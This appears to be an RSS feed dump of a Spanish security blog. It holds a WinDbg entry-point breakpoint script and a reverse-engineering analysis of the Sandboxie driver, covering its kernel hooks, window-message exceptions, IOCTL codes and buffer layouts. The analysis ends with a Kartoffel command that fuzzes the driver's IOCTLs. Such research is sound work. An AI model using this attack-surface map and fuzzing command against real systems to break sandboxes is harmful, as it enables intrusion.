@@ -1,0 +1,705 @@
+Feed title: 48Bits Blog
+Link: http://blog.48bits.com
+
+Searching... 5 entries found:
+
+
+Entry title: Windbg Scripting
+Entry link: http://blog.48bits.com/2011/06/21/windbg-scripting/
+Entry content: <p> Aunque el lenguaje de scripting del Windbg no es precisamente una maravilla, si se usa el Windbg con la suficiente frecuencia siempre acaba siendo conveniente tener tus scripts para llevar a cabo algunas tareas repetitivas.</p>
+<p>Un ejemplo tipico es el caso en el que cargas un ejecutable dentro del Windbg y quieres comenzar poniendo BreakPoins hardware. Como el punto en el que el Loader de Windows ejecuta el DebugBreak es anterior al punto en el que se inicializa el contexto del hilo principal del programa, tus BreakPoints hadware desapareceran.<br />
+<span id="more-1914"></span><br />
+Una forma de solucionar ese problema es, por ejemplo, poner un BreakPoint en el EntryPoint de la aplicacion que queremos depurar y poner los BreakPoints hardware una vez que hayamos alcanzado dicho punto. Tener un Script que te ponga un punto de ruptura en el EntryPoint de la aplicacion simplifica muchisimo esta tarea:</p>
+<div class="dean_ch">
+.<span class="me1">block</span><br />
+<span class="br0">&#123;</span><br />
+&nbsp; r? $t0 = &amp;@$peb-&gt;Ldr-&gt;InLoadOrderModuleList<br />
+&nbsp; r? $t0 = *<span class="br0">&#40;</span>ntdll!_LDR_DATA_TABLE_ENTRY**<span class="br0">&#41;</span>@$t0;</p>
+<p>&nbsp; as /x $<span class="br0">&#123;</span>/v:$Base<span class="br0">&#125;</span> @@c++<span class="br0">&#40;</span>@$t0-&gt;DllBase<span class="br0">&#41;</span><br />
+&nbsp; as /msu $<span class="br0">&#123;</span>/v:$Mod<span class="br0">&#125;</span> @@c++<span class="br0">&#40;</span>&amp;@$t0-&gt;FullDllName<span class="br0">&#41;</span></p>
+<p>&nbsp; .<span class="me1">block</span><br />
+&nbsp; <span class="br0">&#123;</span><br />
+&nbsp; &nbsp; .<span class="me1">echo</span> $<span class="br0">&#123;</span>$Mod<span class="br0">&#125;</span> at $<span class="br0">&#123;</span>$Base<span class="br0">&#125;</span></p>
+<p>&nbsp; &nbsp; r $t0 = $<span class="br0">&#123;</span>$Base<span class="br0">&#125;</span> + poi<span class="br0">&#40;</span>$<span class="br0">&#123;</span>$Base<span class="br0">&#125;</span> + 3c<span class="br0">&#41;</span><br />
+&nbsp; &nbsp; .<a href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span class="kw3">printf</span></a> <span class="st0">&quot;PeHeader at: %p <span class="es0">\n</span>&quot;</span>, @$t0</p>
+<p>
+&nbsp; &nbsp; r $t1 = $<span class="br0">&#123;</span>$Base<span class="br0">&#125;</span> + poi<span class="br0">&#40;</span>@$t0 + <span class="nu0">28</span><span class="br0">&#41;</span><br />
+&nbsp; &nbsp; .<a href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span class="kw3">printf</span></a> <span class="st0">&quot;Entry point found at %p <span class="es0">\n</span>&quot;</span>, @$t1</p>
+<p>&nbsp; &nbsp; bp @$t1<br />
+&nbsp; <span class="br0">&#125;</span></p>
+<p>&nbsp; ad $<span class="br0">&#123;</span>/v:$Base<span class="br0">&#125;</span><br />
+&nbsp; ad $<span class="br0">&#123;</span>/v:$Mod<span class="br0">&#125;</span><br />
+<span class="br0">&#125;</span><br />
+&nbsp;</div>
+<p>Un ejemplo de uso de este script depurando la calculadora de windows:</p>
+<div class="dean_ch">
+<span class="nu0">0</span>:<span class="nu0">000</span>&gt; .<span class="me1">symfix</span> c:\symbols<br />
+<span class="nu0">0</span>:<span class="nu0">000</span>&gt; .<span class="me1">reload</span><br />
+Reloading current modules<br />
+&#8230;&#8230;&#8230;..<br />
+<span class="nu0">0</span>:<span class="nu0">000</span>&gt; $$&gt;a&lt;c:\ep.<span class="me1">wds</span><br />
+C:\WINDOWS\system32\calc.<span class="me1">exe</span> at 0&#215;1000000<br />
+PeHeader at: 010000f0 <br />
+Entry point found at <span class="nu0">01012475</span> <br />
+&nbsp;</div>
+<p>A mi personalmente me gusta mas el sistema de extensiones del Windbg, pero tengo que reconocer que para algunas cosas en las que no te quieres complicar mucho la vida, los scripts de Windbg pueden estar bien <img src="http://blog.48bits.com/wp-includes/images/smilies/icon_surprised.gif" alt=":o" class="wp-smiley" /> )</p>
+Entry date: Tue, 21 Jun 2011 15:34:20 +0000
+Entry date_parsed: time.struct_time(tm_year=2011, tm_mon=6, tm_mday=21, tm_hour=15, tm_min=34, tm_sec=20, tm_wday=1, tm_yday=172, tm_isdst=0)
+Epoch Seconds:  1308663260.0
+Entry id: http://blog.48bits.com/?p=1914
+
+- - - - - - - - - -
+
+Entry title: Sandbox I. Sandboxie. Aislamiento de procesos mediante control de acceso a objetos en kernel.
+Entry link: http://blog.48bits.com/2011/05/23/sandbox-i-sandboxie-aislamiento-de-procesos-mediante-control-de-acceso-a-objetos-en-kernel/
+Entry content: <p><strong><span>0. Indice:</span></strong></p>
+<p><strong><span> </span></strong></p>
+<ul>
+<li><strong>1. Introducción.</strong></li>
+<li><strong>2. Diseño de Sandboxie.</strong></li>
+<li><strong>3. Control de acceso a recursos.</strong>
+<ul>
+<li><strong>3.1. El hookeo en objectos de \ObjectTypes.</strong></li>
+</ul>
+<ul>
+<li><strong>3.2. Los hookeos en la ssdt y la shadow ssdt.</strong></li>
+</ul>
+</li>
+<li><strong> </strong><strong>4. Los io controles.</strong></li>
+<li><strong> </strong><strong>5. Seguridad de Sandboxie.</strong>
+<ul>
+<li><strong>5.1. Fuzzing de io controls.</strong></li>
+</ul>
+<ul>
+<li><strong>5.2. Envío de mensajes a </strong><strong>Shell_TrayWnd (ventana excluída por Sandboxie).</strong></li>
+</ul>
+<ul>
+<li><strong>5.3. Nombres largos.</strong></li>
+</ul>
+<ul>
+<li><strong>5.4. Parseo de formatos complejos.</strong></li>
+</ul>
+<ul>
+<li><strong>5.5. Conclusión.</strong></li>
+</ul>
+</li>
+</ul>
+<p><strong><span>1. Introducción:</span></strong></p>
+<p><strong> </strong></p>
+<p>En este artículo voy a hablar de Sandboxie, una sandbox que realiza aislamiento de procesos y cuyos pilares son:</p>
+<p>-El control de acceso a objetos en kernel mediante hooks directos en las estructuras de los mismos objetos.</p>
+<p>-Algunos hookeos en la ssdt y la shadow ssdt para control de mensajes a ventanas de procesos no sandboxeados.</p>
+<p>-Algunos callbacks registrados en el sistema para control de creación de procesos, imágenes cargadas, etc…</p>
+<p>Hablaré un poco del diseño de la sandbox, las técnicas que usa para “construir la celda”, y lo fiable o no que, bajo mi punto de vista, pueden llegar a ser este tipo de sandbox.</p>
+<p><span id="more-1874"></span></p>
+<p><strong><span>2. Diseño de Sandboxie:</span></strong></p>
+<p><strong><span> </span></strong></p>
+<p>Aunque sandboxie consta de la aplicación que hace de interfaz, un servicio, etc&#8230; Y otros componentes, en relación con la sandbox sólo nos interesan el driver (sbiedrv.sys) y la dll que inyecta en todos los procesos sandboxeados (sbiedll.dll).</p>
+<p><img class="alignnone" title="Diseño Sandboxie" src="http://blog.48bits.com/wp-content/uploads/2011/05/sandboxie_design.jpg" alt="" width="602" height="744" /></p>
+<p>A grandes rasgos Sandboxie funciona de la siguiente manera:</p>
+<p>El driver de Sandboxie <strong>hookea todo lo necesario en kernel para proteger los recursos que quiere proteger de los procesos sandboxeados</strong>.</p>
+<p>El driver pone además un <strong>callback con PsLoadImageNotifyRoutine y PsCreateProcessNotifyRoutine</strong> para ser notificado cuando se carga una imagen en un proceso y cuando se crea un proceso. El driver <strong>mantiene una lista de procesos sandboxeados en kernel</strong>, y gracias a estos callbacks puede mantener actualizadas las listas de los procesos sanboxeados. Lo que hace es comprobar <strong>si el padre del proceso creado es sandboxeado</strong>, y si lo es, <strong>el hijo pasa a la lista también</strong> (también es posible mediante io controles indicar que un proceso debe pasar a considerarse sandboxeado. Esto es necesario para lanzar procesos sandboxeados desde la interfaz de usuario de Sandboxie).</p>
+<p>El driver no se complica la vida en el control de acceso a recursos protegidos: <strong>si es un proceso sandboxeado deniega el acceso a cualquier recurso protegido, si no es sandboxeado, lo permite.</strong></p>
+<p>Sin embargo cuando manejamos Sandboxie  vemos que permite el acceso a algunos recursos protegidos desde los procesos sandboxeados. Además crea un sistema de archivos, entradas de registro, etc… paralelos para cada sandbox manejada.</p>
+<p>Para controlar esto <strong>el driver de Sandboxie exporta una serie de io controls</strong>. Exporta mucha funcionalidad mediante estos io controls, y <strong>algunos de ellos sirven para acceder a los recursos protegidos desde los procesos sandboxeados, pero de una manera controlado</strong> (discriminando a qué tiene acceso y a qué no, el proceso sandboxeado).</p>
+<p>Aquí es donde entra en juego la dll <strong>SbieDll que entre otras cosas hookea todas las exports en todas las dlls de cada proceso sandboxeado</strong>.</p>
+<p>Esta dll es fundamental para que el proceso sandboxeado funcione correctamente ya que <strong>en el hook de ciertas apis conocidas (ZwCreateFile, ZwCreateProcess, ZwOpenKey, etc…) la dll corta el flujo normal hacía kernel para redirigirlo hacía los io controles del driver donde se realizará un acceso a los recursos protegidos de manera controlada </strong>(una pequeña prueba que demuestra esto es que si quitamos con HookShark por ejemplo todos los hooks de modo usuario se nos queda un proceso sandboxeado sin acceso a nada, porque el driver lo deniega todo).</p>
+<p><strong><span>3. Control de acceso a recursos:</span></strong></p>
+<p>No se si se me ha escapado algo de lo que SbieDrv intercepta en kernel. <strong>Los principales hookeos</strong> que he visto que realiza son:</p>
+<p><strong>En los objetos token, process, thread, event, section, port y semaphore, de tipo Type, que cuelgan de \ObjectTypes</strong>, hookean el puntero a función de tipo OB_OPEN_METHOD para controlar el acceso a este tipo de objetos:</p>
+<p><strong>OBJECT_TYPE -&gt;OBJECT_TYPE_INITIALIZER-&gt; OpenProcedure</strong></p>
+<p>Sólo con esto puede <strong>controlar el acceso a disco, registro, etc…</strong></p>
+<p>Pero todavía necesita <strong>controlar todo el tema de ventanas</strong>, que lo maneja win32k.sys: debe cortar el envío de mensajes de las ventanas de aplicaciones sandboxeadas a las ventanas de las no sandboxeadas, debe evitar que las aplicaciones sandboxeadas puedan registrar Windows hooks, etc…</p>
+<p>Para poder hacer esto SbieDrv necesita interceptar <strong>algunas funciones de la ssdt y la shadow ssdt:</strong></p>
+<h5><span><strong>win32k_NtUserCallHwndParamLock<br />
+</strong><strong>win32k_NtUserDestroyWindow<br />
+</strong><strong>win32k_NtUserShowWindow<br />
+</strong><strong>win32k_NtUserSendInput<br />
+</strong><strong>win32k_NtUserBlockInput<br />
+</strong><strong>win32k_NtUserSystemParametersInfo<br />
+</strong><strong>win32k_NtUserSetSysColors<br />
+</strong><strong>win32k_NtUserSetSystemCursor<br />
+</strong><strong>win32k_NtUserMessageCall<br />
+</strong><strong>win32k_NtUserPostMessage<br />
+</strong><strong>win32k_NtUserPostThreadMessage<br />
+</strong><strong>win32k_NtUserSetWindowsHookEx<br />
+</strong><strong>win32k_NtUserSetWinEventHook<br />
+</strong><strong>nt_NtRequestPort<br />
+</strong><strong>nt_NtRequestWaitReplyPort<br />
+</strong><strong>nt_NtTraceEvent</strong></span></h5>
+<p><strong><span>3.1. El hookeo en objectos de \ObjectTypes:</span></strong></p>
+<p>Vamos a ver primero como son estos objetos que cuelgan del <strong>directorio</strong> <strong>ObjectTypes</strong>. Tomamos para el ejemplo el objeto \ObjectTypes\Token:</p>
+<h5><span><strong>WINDBG&gt;!object \ObjectTypes<br />
+</strong>Object: e1000548  Type: (819f1418) <strong>Directory<br />
+</strong>ObjectHeader: e1000530 (old version)<br />
+HandleCount: 0  PointerCount: 25<br />
+Directory Object: e1001520  Name: ObjectTypes</p>
+<p>Hash Address  Type          Name<br />
+&#8212;- &#8212;&#8212;-  &#8212;-          &#8212;-<br />
+00  819f1418 Type          Directory<br />
+01  819ccca0 Type          Thread<br />
+819c95e0 Type          Mutant<br />
+03  8198cca0 Type          FilterCommunicationPort<br />
+05  819b8e70 Type          Controller<br />
+07  819c8ca0 Type          Profile<br />
+819c9980 Type          Event<br />
+819f15e8 Type          Type<br />
+09  819c8560 Type          Section<br />
+819c97b0 Type          EventPair<br />
+819f1248 Type          SymbolicLink<br />
+10  819c8730 Type          Desktop<br />
+11  819c8e70 Type          Timer<br />
+12  819b8730 Type          File<br />
+819c8900 Type          WindowStation<br />
+16  819b8ad0 Type          Driver<br />
+18  819eb910 Type          WmiGuid<br />
+819c8ad0 Type          KeyedEvent<br />
+<strong> 19  819cc040 Type          Token<br />
+</strong>819b8ca0 Type          Device<br />
+20  819cc408 Type          DebugObject<br />
+21  819b8900 Type          IoCompletion<br />
+22  819cce70 Type          Process<br />
+24  819f0300 Type          Adapter<br />
+26  819c5980 Type          Key<br />
+28  819ccad0 Type          Job<br />
+31  819f0708 Type          WaitablePort<br />
+819f08d8 Type          Port<br />
+32  819c9410 Type          Callback<br />
+33  8198ce70 Type          FilterConnectionPort<br />
+34  819c8040 Type          Semaphore</p>
+<p><strong>WINDBG&gt;!object 819cc040<br />
+</strong>Object: 819cc040  Type: (819f15e8) <strong>Type<br />
+</strong>ObjectHeader: 819cc028 (old version)<br />
+HandleCount: 0  PointerCount: 1<br />
+Directory Object: e1000548  Name: <strong>Token<br />
+</strong></p>
+<p><strong>WINDBG&gt;dt _OBJECT_TYPE 819cc040<br />
+</strong>ntdll!_OBJECT_TYPE<br />
++0&#215;000 Mutex            : _ERESOURCE<br />
++0&#215;038 TypeList         : _LIST_ENTRY [ 0x819cc078 - 0x819cc078 ]<br />
++0&#215;040 Name             : _UNICODE_STRING &#8220;Token&#8221;<br />
++0&#215;048 DefaultObject    : 0x80558cc0<br />
++0x04c Index            : 4<br />
++0&#215;050 TotalNumberOfObjects : 0x1a<br />
++0&#215;054 TotalNumberOfHandles : 0&#215;10<br />
++0&#215;058 HighWaterNumberOfObjects : 0x1d<br />
++0x05c HighWaterNumberOfHandles : 0&#215;14<br />
+<strong> +0&#215;060 TypeInfo         : _OBJECT_TYPE_INITIALIZER<br />
+</strong>+0x0ac Key              : 0x656b6f54<br />
++0x0b0 ObjectLocks      : [4] _ERESOURCE<br />
+Como vemos de \ObjectTypes cuelgan varios objetos de tipo Type. La estructura de estos objetos es de tipo _OBJECT_TYPE.</p>
+<p></span></h5>
+<p>Dentro de esta estructura _OBJECT_TYPE nos interesa especialmente <strong>OBJECT_TYPE_INITIALIZER</strong> porque dentro de esta subestructura vamos a tener los punteros a los callbacks que son llamados cuando se abre, cierra, etc… los objetos de este tipo.</p>
+<h5><span>typedef struct _OBJECT_TYPE_INITIALIZER {<br />
+USHORT Length;   2 bytes<br />
+BOOLEAN UseDefaultObject; 1 byte<br />
+BOOLEAN Reserved; 1 byte<br />
+ULONG InvalidAttributes; 4 bytes<br />
+GENERIC_MAPPING GenericMapping; 16 bytes<br />
+ULONG ValidAccessMask; 4 bytes<br />
+BOOLEAN SecurityRequired; 1 byte<br />
+BOOLEAN MaintainHandleCount; 1 byte<br />
+BOOLEAN MaintainTypeList; 1 byte<br />
+POOL_TYPE PoolType; 1 byte<br />
+ULONG ObjectTypeCode; 4 bytes //-&gt; depende de la versión del sistema operativo,<br />
+//de esto depende que se acceda a +30h<br />
+//o a +34h para buscar el puntero para hookear<br />
+ULONG DefaultPagedPoolCharge; 4 bytes<br />
+ULONG DefaultNonPagedPoolCharge; 4 bytes<br />
+//&#8212;&#8212;<br />
+OB_DUMP_METHOD DumpProcedure; 4 bytes<br />
+<strong> OB_OPEN_METHOD OpenProcedure; 4 bytes<br />
+</strong>OB_CLOSE_METHOD CloseProcedure; 4 bytes<br />
+OB_DELETE_METHOD DeleteProcedure; 4 bytes<br />
+OB_PARSE_METHOD ParseProcedure; 4 bytes<br />
+OB_SECURITY_METHOD SecurityProcedure; 4 bytes<br />
+OB_QUERYNAME_METHOD QueryNameProcedure; 4 bytes<br />
+OB_OKAYTOCLOSE_METHOD OkayToCloseProcedure; 4 bytes<br />
+//&#8212;&#8212;<br />
+} OBJECT_TYPE_INITIALIZER, *POBJECT_TYPE_INITIALIZER;</span></h5>
+<p>Dependiendo de la versión del sistema operativo esta estructura tiene un campo más o no (el campo ObjectTypeCode). SbieDrv tiene en cuenta este detalle para hookear correctamente el puntero OpenProcedure en todas las versiones que soporta.</p>
+<p>Este puntero es de tipo <strong>OB_OPEN_METHOD</strong>:</p>
+<h5><span><strong>typedef NTSTATUS<br />
+</strong><strong>(NTAPI *OB_OPEN_METHOD)(<br />
+</strong><strong> IN OB_OPEN_REASON Reason,<br />
+</strong><strong> IN PEPROCESS Process OPTIONAL,<br />
+</strong><strong> IN PVOID ObjectBody,<br />
+</strong><strong> IN ACCESS_MASK GrantedAccess,<br />
+</strong><strong> IN ULONG HandleCount<br />
+</strong><strong>);</strong></span></h5>
+<p>Este callback es llamado cuando se abre un objeto del tipo en el que se hookea. En este caso cuando se abra un objeto de tipo Token se llamará a este callback, y aquí es posible controlar la apertura de dicho objeto.</p>
+<p>Como hemos dicho SbieDrv hookea el callback OpenProcedure para los objetos de tipo <strong>token, process, thread, event, section, port y semaphore. </strong>Aquí vemos como SbieDrv llama a la función que realiza todo el hookeo con el nombre de cada objeto y el puntero para el hook de éste:</p>
+<p><img class="alignnone" title="hook token" src="http://blog.48bits.com/wp-content/uploads/2011/05/hookeo_token_process.jpg" alt="" width="570" height="736" /></p>
+<p>Vemos como comprueba la versión y el build del sistema operativo para calcular los offsets dentro de las estructuras del objeto donde encontrar el OpenProcedure.</p>
+<h5><span>&#8212;&#8212;<br />
+Si version &lt; 4:<br />
+Si BuildNumber &lt;= 1770h:<br />
+OpenProcedureOffset = pTypeObjHeader+30h+60h<br />
+Sino:<br />
+OpenProcedureOffset = pTypeObjHeader+30h+28h<br />
+Sino:<br />
+Si BuildNumber &lt;= 1770h:<br />
+OpenProcedureOffset = pTypeObjHeader+30h+60h<br />
+Sino:<br />
+OpenProcedureOffset = pTypeObjHeader+34h+28h<br />
+&#8212;&#8212;</span></h5>
+<p><img class="alignnone" title="hook OpenProcedure" src="http://blog.48bits.com/wp-content/uploads/2011/05/hookeo_openprocedure.jpg" alt="" width="835" height="737" /></p>
+<p>Para el hookeo utiliza una pieza de código que escribe en memoria del sistema operativo, seguramente porque el sistema operativo controla que estos punteros apunten a memoria suya. <strong>Las piezas de código con las que hookea</strong> son siempre así:</p>
+<p><img class="alignnone" title="hook code" src="http://blog.48bits.com/wp-content/uploads/2011/05/codigohookeo.jpg" alt="" width="904" height="432" /></p>
+<p>Esta función que he nombrado “ComprobarProcessIdEnListaDeSandboxeadosObtenerEstructura” busca en las listas de procesos sandboxeados el processid que se le pasa. Si se le pasa cero busca el current process. Como vemos en <strong>el trozo que usa para hookear siempre comprueba si el proceso actual es sandboxeado. Si no lo es, deja acceder. Si lo es, pasa a llamar a una función específica del tipo de objeto accedido</strong> (una para Token, otra para Process, etc…), pero en este punto ya ha decidido cortar el acceso al objeto (el proceso tendrá que acceder a estos objetos usando los io controles de SbieDrv).</p>
+<p><strong> </strong></p>
+<p>En la imagen a continuación vemos el punto donde SbieDrv compone el bloque de código para el hookeo y el punto donde escribe el puntero en la estructura de kernel.</p>
+<p><img class="alignnone" title="hook OpenProcedure" src="http://blog.48bits.com/wp-content/uploads/2011/05/hookeo_openprocedure2.jpg" alt="" width="811" height="1342" /></p>
+<p><strong><span>3.2. Los hookeos en la ssdt y la shadow ssdt:</span></strong></p>
+<p>Como hemos dicho antes Sandboxie hookea las siguientes apis:</p>
+<h5><span><strong>win32k_NtUserCallHwndParamLock<br />
+</strong><strong>win32k_NtUserDestroyWindow<br />
+</strong><strong>win32k_NtUserShowWindow<br />
+</strong><strong>win32k_NtUserSendInput<br />
+</strong><strong>win32k_NtUserBlockInput<br />
+</strong><strong>win32k_NtUserSystemParametersInfo<br />
+</strong><strong>win32k_NtUserSetSysColors<br />
+</strong><strong>win32k_NtUserSetSystemCursor<br />
+</strong><strong>win32k_NtUserMessageCall<br />
+</strong><strong>win32k_NtUserPostMessage<br />
+</strong><strong>win32k_NtUserPostThreadMessage<br />
+</strong><strong>win32k_NtUserSetWindowsHookEx<br />
+</strong><strong>win32k_NtUserSetWinEventHook<br />
+</strong><strong>nt_NtRequestPort<br />
+</strong><strong>nt_NtRequestWaitReplyPort<br />
+</strong><strong>nt_NtTraceEvent</strong></span></h5>
+<p>La mayoría están relacionadas con el control de mensajes de ventana a las aplicaciones sandboxeadas. Vamos a analizar por ejemplo el hook a win32k_NtUserMessageCall:</p>
+<p><img class="alignnone" title="hook mensajes" src="http://blog.48bits.com/wp-content/uploads/2011/05/hookmensajes.jpg" alt="" width="613" height="561" /></p>
+<p>En varias de las apis interceptadas hay que gestionar un mensaje de ventana enviado a una ventana concreta. SbieDrv tiene una <strong>función común que hace esta gestión, la que he nombrado Hook_Win32k_Gestiona_MensajeDeVentana</strong>:</p>
+<p><img class="alignnone" title="gestión mensajes" src="http://blog.48bits.com/wp-content/uploads/2011/05/gestionmensajes.jpg" alt="" width="842" height="740" /></p>
+<p>Esta función va comprobando el mensaje y sus parámetros para decidir qué mensajes permite enviar a las aplicaciones sandboxeadas y cuáles no. La función Hook_Win32k_Gestiona_MensajeDeVentana actúa de esta manera:</p>
+<p>-Primero obtiene el id del proceso que envía y el que recibe el mensaje. <strong>Si el proceso que envía y el que recibe es el mismo, deja pasar el msg</strong>.</p>
+<p>-Sino, comprueba <strong>si el receptor es un sandboxeado</strong>. Si lo es, <strong>deja pasar el mensaje</strong>.</p>
+<p>-A continuación comprueba <strong>si el msg es 0x3e4</strong> y si lo es <strong>lo deja pasar</strong>.</p>
+<p>- Luego obtiene el nombre de la clase de la ventana objetivo. Tiene una lista de nombres de <strong>clases de ventanas que deben ser tratadas como excepciones</strong> para las cuales se permiten algunos mensajes adicionales:</p>
+<h5><span><strong>TrayNotifyWnd<br />
+</strong><strong>SystemTray_Main<br />
+</strong><strong>Connections Tray<br />
+</strong><strong>MS_WebcheckMonitor<br />
+</strong><strong>PrintTray_Notify_WndClass<br />
+</strong><strong>CicLoaderWndClass<br />
+</strong><strong>CicMarshalWndClass<br />
+</strong><strong>Logitech Wingman Internal Message Router<br />
+</strong><strong>devldr<br />
+</strong><strong>CTouchPadSynchronizer<br />
+</strong><strong>Type32_Main_Window<br />
+</strong><strong>TForm_AshampooFirewall<br />
+</strong><strong>WinVNC desktop sink<br />
+</strong><strong>Afx:400000:0<br />
+</strong><strong>NVIDIA TwinView Window<br />
+</strong><strong>Shell_TrayWnd</strong></span></h5>
+<p>Seguramente necesite meter estas excepciones para el funcionamiento correcto de algunas aplicaciones típicas: explorer, navegadores, etc…</p>
+<p><img class="alignnone" title="ventanas excluídas" src="http://blog.48bits.com/wp-content/uploads/2011/05/ventanasexcluidas.jpg" alt="" width="500" height="436" /></p>
+<p>-Si el mensaje no es para un proceso de la sandbox, y el que envía sí es un proceso de la sandbox, si la ventana objetivo no es una de las dichas anteriormente, sale directamente prohibiendo el envío del mensaje.</p>
+<p>-<strong>Para todas las clases de ventanas que son excepciones</strong> primero comprueba si el mensaje es de tipo WM_USER (0&#215;400) o mayor. Si es por debajo de 0&#215;400, comprueba contra la siguiente <strong>lista de mensajes inválidos</strong> para estas clases de ventanas conocidas:</p>
+<h5><span><strong>2h – WM_DESTROY<br />
+</strong><strong>0Bh &#8211; WM_SETREDRAW<br />
+</strong><strong>10h &#8211; WM_CLOSE<br />
+</strong><strong>11h &#8211; WM_QUERYENDSESSION<br />
+</strong><strong>12h &#8211; WM_QUIT<br />
+</strong><strong>16h &#8211; WM_ENDSESSION<br />
+</strong><strong>3Bh -<br />
+</strong><strong>4Eh &#8211; WM_NOTIFY<br />
+</strong><strong>82h &#8211; WM_NCDESTROY<br />
+</strong><strong>111h &#8211; WM_COMMAND<br />
+</strong><strong>112h &#8211; WM_SYSCOMMAND<br />
+</strong><strong>319h</strong></span></h5>
+<p>-<strong>Si no es ninguno de los anteriores ids, sale dejando pasar el mensaje.</strong></p>
+<p>-Si es un mensaje por arriba de 0&#215;400, según la clase de ventana que sea, deja pasar unos u otros. Por ejemplo para Shell_TrayWnd deja pasar el id de msg 0x4ec.</p>
+<p>
+<p><strong><span>4. Los io controles:</span></strong></p>
+<p><strong><span> </span></strong></p>
+<p>Sandboxie crea el siguiente device:</p>
+<p><strong>\device\SandboxieDriverApi</strong></p>
+<p><strong> </strong></p>
+<p>Para enviar io controles a Sandboxie él espera que sean:</p>
+<p>DeviceType = FILE_DEVICE_UNKNOWN = 0&#215;00000022</p>
+<p>Function = 0&#215;801</p>
+<p>Method = METHOD_NEITHER</p>
+<p>Access = 0</p>
+<p><strong> </strong></p>
+<p><strong>CTL_CODE(0&#215;00000022, 0&#215;801, METHOD_NEITHER, 0);</strong></p>
+<p><strong> </strong></p>
+<p>Por lo tanto el driver accede desde kernel a un buffer en user mode para recuperar los parámetros del io control. El formato de dicho buffer depende de la operación que se le solicite. Este buffer en zona de usuario tiene que tener un tamaño entre 0&#215;8 y 0&#215;40 bytes. El primer DWORD siempre es un valor 0x123400XX, que son los ids de las distintas operaciones que ofrece SbieDrv a través de sus io controles. SbieDrv tiene asociada una función a cada id soportado para gestionar el io control.</p>
+<p>A continuación los io controles soportados.</p>
+<p><img class="alignnone" title="io controles" src="http://blog.48bits.com/wp-content/uploads/2011/05/iocontroles.jpg" alt="" width="690" height="685" /></p>
+<h5><span><strong>0&#215;12340001:<br />
+</strong><strong>[0x12340001][XXXXXXXX][ptr zona mem usuario out]<br />
+</strong>Este ioctl guarda en el puntero en zona de usuario la cadena de versión de sandboxie.<br />
+<strong>0&#215;12340002:<br />
+</strong><strong>[0x12340002][XXXXXXXX][XXXXXXXX][XXXXXXXX][ptr zona mem usuario out] [XXXXXXXX][XXXXXXXX][XXXXXXXX][XXXXXXXX]<br />
+</strong>Pedir lista de procesos sandboxeados.<br />
+<strong>0&#215;12340003:<br />
+</strong>Petición de escritura de fichero.<br />
+<strong>0&#215;12340007:<br />
+</strong><strong>[0x12340007][XXXXXXXX][XXXXXXXX][XXXXXXXX][XXXXXXXX][XXXXXXXX][ptr zona mem usuario]<br />
+</strong><strong>0&#215;12340008:<br />
+</strong><strong>[0x12340008][XXXXXXXX][XXXXXXXX][XXXXXXXX][XXXXXXXX][XXXXXXXX] [XXXXXXXX][XXXXXXXX][XXXXXXXX][XXXXXXXX][ptr mem usr][XXXXXXXX][ptr mem usr][XXXXXXXX][ptr mem usr]<br />
+</strong><strong>0&#215;12340009: </strong>Obtener objecto proceso a partir de pid<br />
+<strong>0x1234000a<br />
+</strong><strong>0x1234000b: </strong>Parece que sirve para pedir información de procesos sandboxeados.<br />
+El proceso sbiectrl.exe está constantemente mandando los códigos 0x1234000b, 0x1234000c y 0&#215;12340002 al driver.<br />
+<strong>0x1234000c: </strong>Parece que pregunta al driver la fecha y hora.<br />
+<strong>0x1234000d:</strong> Con este iocontrol se pide que el driver desproteja una dirección en modo usuario para luego meterle el jump del hook. Así hookea sbiedll (en la rva 0xe7a9) en modo usuario.<br />
+<strong>[0x1234000D][XXXXXXXX][ptr funcion modo usuario][XXXXXXXX][ptr memoria usuario info hook]<br />
+</strong><strong>0x1234000f</strong>: Sirve para consultar una opción de una sandbox. Algunas opciones de sandboxie:<br />
+DisableBoxedWinSxS<br />
+InjectDll<br />
+AutoExec<br />
+OpenProtectedStorage<br />
+OpenCredentials<br />
+OpenWinClass<br />
+NoRenameWinClass<br />
+BoxNameTitle<br />
+ClsidTrace<br />
+OpenClsid<br />
+StartService<br />
+StartProgram<br />
+AutoRecover<br />
+RecoverFolder -&gt; para recuperar todas las carpetas de autorecover<br />
+AutoRecoverIgnore<br />
+<strong>0&#215;12340010: </strong>Con este iocontrol se le pide al driver que se actualice con los datos de los ini: sandboxie.ini y templates.ini. El propio driver se pone a parsear los ini.<br />
+<strong>0&#215;12340011<br />
+</strong><strong>0&#215;12340015<br />
+</strong><strong>0&#215;12340016: </strong>En este iocontrol se hookean las funciones de ntoskrnl.exe y de win32k.sys (de la ssdt y la shadow).<br />
+<strong>0&#215;12340019<br />
+</strong><strong>0x1234001e<br />
+</strong><strong>0x1234001f: </strong>Relacionado con los accesos a disco.<br />
+<strong>0&#215;12340021<br />
+</strong><strong>0&#215;12340024<br />
+</strong><strong>0&#215;12340025<br />
+</strong><strong>0&#215;12340026<br />
+</strong><strong>0&#215;12340028<br />
+</strong><strong>0x1234002b: </strong>Obtener handle a proceso.</span></h5>
+<p><span><strong> </strong></span></p>
+<p><span><strong> </strong></span></p>
+<p><span><strong> </strong></span></p>
+<p><span><strong> </strong></span></p>
+<p><span><strong> </strong></span></p>
+<p><span><strong> </strong></span></p>
+<p><strong><span>5. Seguridad de Sandboxie:</span></strong></p>
+<p><strong><span> </span></strong></p>
+<p>Primero vamos a ver algunos detalles y a hacer algunas pruebas relacionadas con este tema.</p>
+<p><strong><span>5.1. Fuzzing de io controls:</span></strong></p>
+<p><strong><span> </span></strong></p>
+<p>SandBoxie exporta varios io controles con mucha funcionalidad necesaria para su funcionamiento, tanto a procesos sandboxeados como no sandboxeados.</p>
+<p>No he entrado muy en detalle en el fuzzing de los io controles, sólo una pequeña prueba realizada con <strong>Kartoffel </strong>(<a href="http://kartoffel.reversemode.com">kartoffel.reversemode.com</a>). Llamamos a Kartoffel con esta <strong>línea de comandos</strong>:</p>
+<p><strong><span>FOR %%A IN (0 1 2) DO FOR %%B IN (0 1 2 3 4 5 6 7 8 9 A B C D E F) DO Kartoffel -d \device\SandboxieDriverApi -n 0&#215;40 -o 0&#215;40 -z 0&#215;40 -Z 0&#215;40 -I 0&#215;222007 -u CUSTOM,&#8221;[P=0x123400%%A%%B::*0][B=0x41::*0x3c$4][!!]&#8220;</span></strong></p>
+<p>Con esta orden vamos a enviar a io controles con id desde 0&#215;12340001 hasta 0x1234002f, seguidos por un buffer lleno de ‘A’. Todo junto tiene un tamaño de 0&#215;40 (el máximo soportado por Sandboxie).</p>
